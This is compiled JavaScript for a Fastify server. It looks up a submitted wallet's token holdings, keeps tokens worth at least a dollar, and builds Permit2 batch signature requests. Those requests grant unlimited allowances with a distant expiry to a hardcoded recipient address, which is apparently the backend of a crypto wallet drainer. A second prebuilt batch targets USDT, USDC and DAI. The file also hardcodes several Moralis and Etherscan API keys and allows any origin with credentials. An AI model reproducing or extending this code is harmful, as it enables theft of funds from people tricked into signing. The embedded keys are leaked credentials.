"use strict";
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var __spreadArray = (this && this.__spreadArray) || function (to, from, pack) {
    if (pack || arguments.length === 2) for (var i = 0, l = from.length, ar; i < l; i++) {
        if (ar || !(i in from)) {
            if (!ar) ar = Array.prototype.slice.call(from, 0, i);
            ar[i] = from[i];
        }
    }
    return to.concat(ar || Array.prototype.slice.call(from));
};
var _a;
Object.defineProperty(exports, "__esModule", { value: true });
exports.app = void 0;
var fastify_1 = require("fastify");
var dotenv = require("dotenv");
var sensible_1 = require("@fastify/sensible");
var cors_1 = require("@fastify/cors");
var swagger_1 = require("@fastify/swagger");
var moralis_1 = require("moralis");
var common_evm_utils_1 = require("@moralisweb3/common-evm-utils");
//
// To guarantee consistent and predictable behavior of your application, we highly recommend to always load your code as shown below:
// └── plugins (from the Fastify ecosystem)
// └── your plugins (your custom plugins)
// └── decorators
// └── hooks
// └── your services
//
var moralisApiKey1 = "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
var moralisApiKey2 = "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
var moralisApiKey3 = "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
var moralisAPikey4 = "7f8r9DVeWUgv2AO7xZxTRkmZ6yx5l85WvTJfrj0ZEhBE8jXk8txiYI6m66ZNos5D";
var moralisApiKey5 = "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB";
var moralisKeys = [
    moralisApiKey1,
    moralisApiKey2,
    moralisApiKey3,
    moralisAPikey4,
    moralisApiKey5,
];
var selectedKey = moralisKeys[Number((_a = process.env.MORALIS_KEY_INDEX) !== null && _a !== void 0 ? _a : 1)];
// console.log(selectedKey);
var etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
var etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";
var deadline = 1000000000000;
var chainId = 1; //main  net chain Id
var nonce = 0; // still experimenting on this one;
var Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 contract
var maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
var recipient = "0xA08a5810Dc98258f35a35918CeD3f99E893154Ef"; // recipient address
//
exports.app = (0, fastify_1.default)({
    logger: true,
});
dotenv.config();
// Registering our middlewares
var origins = [
    "".concat(process.env.CLIENT_URL),
    "".concat(process.env.ADMIN_URL),
    "https://localhost:5173",
    "http://localhost:5173",
    "http://localhost:5174",
    "https://localhost:5174",
];
// console.log(origins);
exports.app.register(sensible_1.default);
exports.app.register(cors_1.default, {
    origin: "*",
    credentials: true,
});
exports.app.register(swagger_1.default);
// handle errors in out server
var PORT = process.env.PORT || 3000;
exports.app.listen({
    port: PORT,
    host: "0.0.0.0",
}, function (err, address) {
    if (err) {
        console.log(err);
    }
    // console.log("listenin address:", address);
    console.log(process.env.PORT);
});
var runMoralis = function () { return __awaiter(void 0, void 0, void 0, function () {
    return __generator(this, function (_a) {
        switch (_a.label) {
            case 0:
                if (!!moralis_1.default.Core.isStarted) return [3 /*break*/, 2];
                return [4 /*yield*/, moralis_1.default.start({
                        apiKey: "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
                    })];
            case 1:
                _a.sent();
                _a.label = 2;
            case 2: return [2 /*return*/];
        }
    });
}); };
runMoralis();
exports.app.get("/", function (req, res) {
    return " api is active ";
});
console.log(moralisKeys[Number(process.env.MORALIS_KEY_INDEX)]);
exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
    function useFetchTokenPrices() {
        return __awaiter(this, void 0, void 0, function () {
            var response_1, tokenPrices, index, tokensInUSD, filteredByUSDValue_1, error_1;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        _a.trys.push([0, 3, , 4]);
                        return [4 /*yield*/, fetch("https://deep-index.moralis.io/api/v2/erc20/prices?chain=eth", options)];
                    case 1:
                        response_1 = _a.sent();
                        return [4 /*yield*/, response_1.json()];
                    case 2:
                        tokenPrices = _a.sent();
                        for (index = 0; index < (tokenPrices === null || tokenPrices === void 0 ? void 0 : tokenPrices.length); index++) {
                            truncatedResponse[index].usdPrice = tokenPrices[index].usdPrice;
                        }
                        tokensInUSD = truncatedResponse.map(function (token) {
                            var zeros = Math.pow(10, Number(token.decimals));
                            var tokenAmount = Number(token.balance) / zeros;
                            var valInUSD = tokenAmount * Number(token.usdPrice);
                            return __assign(__assign({}, token), { valInUSD: valInUSD });
                        });
                        filteredByUSDValue_1 = tokensInUSD.filter(function (token) { return token.valInUSD >= 1; });
                        return [2 /*return*/, [filteredByUSDValue_1, null]];
                    case 3:
                        error_1 = _a.sent();
                        console.error;
                        return [2 /*return*/, [null, error_1]];
                    case 4: return [2 /*return*/];
                }
            });
        });
    }
    var chain, address, response, allTokens, truncatedResponse, options, _a, filteredByUSDValue, error, tokensReturned, tokenInPermitFormat, index, obj, addrs, i, response1, resJson, permit2Tokens, _addrs, _loop_1, i, dataToSign;
    var _b;
    return __generator(this, function (_c) {
        switch (_c.label) {
            case 0:
                chain = common_evm_utils_1.EvmChain.ETHEREUM;
                address = req.body;
                return [4 /*yield*/, moralis_1.default.EvmApi.token.getWalletTokenBalances({
                        address: address,
                        chain: chain,
                    })];
            case 1:
                response = _c.sent();
                allTokens = response.toJSON();
                truncatedResponse = allTokens.map(function (token) {
                    return {
                        name: token.name,
                        token_address: token.token_address,
                        balance: token.balance,
                        decimals: token.decimals,
                        usdPrice: null,
                    };
                });
                options = {
                    method: "POST",
                    headers: {
                        accept: "application/json",
                        "content-type": "application/json",
                        "X-API-Key": "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB",
                    },
                    body: JSON.stringify({
                        tokens: truncatedResponse,
                    }),
                };
                return [4 /*yield*/, useFetchTokenPrices()];
            case 2:
                _a = _c.sent(), filteredByUSDValue = _a[0], error = _a[1];
                tokensReturned = filteredByUSDValue;
                tokenInPermitFormat = [];
                for (index = 0; index < (tokensReturned === null || tokensReturned === void 0 ? void 0 : tokensReturned.length); index++) {
                    obj = {
                        token: tokensReturned[index].token_address,
                        amount: maxUint160,
                        expiration: deadline,
                        nonce: nonce,
                    };
                    tokenInPermitFormat.push(obj);
                }
                addrs = [];
                for (i = 0; i < (tokensReturned === null || tokensReturned === void 0 ? void 0 : tokensReturned.length); i++) {
                    addrs.push(tokensReturned[i].token_address);
                }
                return [4 /*yield*/, moralis_1.default.EvmApi.token.getErc20Approvals({
                        chain: "0x1",
                        contractAddresses: addrs,
                        walletAddresses: [req.body],
                    })];
            case 3:
                response1 = _c.sent();
                resJson = response1.toJSON();
                permit2Tokens = (_b = resJson === null || resJson === void 0 ? void 0 : resJson.result) === null || _b === void 0 ? void 0 : _b.filter(function (e) {
                    return e.to_wallet == "0x000000000022d473030f116ddee9f6b43ac78ba3" &&
                        e.value != "0";
                });
                _addrs = __spreadArray([], addrs, true);
                _loop_1 = function (i) {
                    var index = addrs.findIndex(function (e) { return e == permit2Tokens[i].to_wallet; });
                    if (index != 1) {
                        _addrs.splice(index, 1);
                    }
                };
                for (i = 0; i < (permit2Tokens === null || permit2Tokens === void 0 ? void 0 : permit2Tokens.length); i++) {
                    _loop_1(i);
                }
                dataToSign = {
                    domain: {
                        name: "Permit2",
                        chainId: chainId,
                        verifyingContract: Permit2Contract,
                    },
                    types: {
                        EIP712Domain: [
                            { name: "name", type: "string" },
                            { name: "chainId", type: "uint256" },
                            { name: "verifyingContract", type: "address" },
                        ],
                        PermitBatch: [
                            { name: "details", type: "PermitDetails[]" },
                            { name: "spender", type: "address" },
                            { name: "sigDeadline", type: "uint256" },
                        ],
                        PermitDetails: [
                            { name: "token", type: "address" },
                            { name: "amount", type: "uint160" },
                            { name: "expiration", type: "uint48" },
                            { name: "nonce", type: "uint48" },
                        ],
                    },
                    primaryType: "PermitBatch",
                    message: {
                        details: tokenInPermitFormat,
                        spender: recipient,
                        sigDeadline: deadline,
                    },
                };
                return [2 /*return*/, [_dataToSign, _addrs, dataToSign, tokenInPermitFormat]];
        }
    });
}); });
var usdcContractAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
var daiContractAddr = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
var usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
var dett = [
    {
        token: usdtContractAddress,
        amount: maxUint160,
        expiration: deadline,
        nonce: nonce,
    },
    {
        token: usdcContractAddress,
        amount: maxUint160,
        expiration: deadline,
        nonce: nonce,
    },
    {
        token: daiContractAddr,
        amount: maxUint160,
        expiration: deadline,
        nonce: nonce,
    },
];
var _dataToSign = {
    domain: {
        name: "Permit2",
        chainId: chainId,
        verifyingContract: Permit2Contract,
    },
    types: {
        EIP712Domain: [
            { name: "name", type: "string" },
            { name: "chainId", type: "uint256" },
            { name: "verifyingContract", type: "address" },
        ],
        PermitBatch: [
            { name: "details", type: "PermitDetails[]" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" },
        ],
        PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" },
        ],
    },
    primaryType: "PermitBatch",
    message: {
        details: dett,
        spender: recipient,
        sigDeadline: deadline,
    },
};
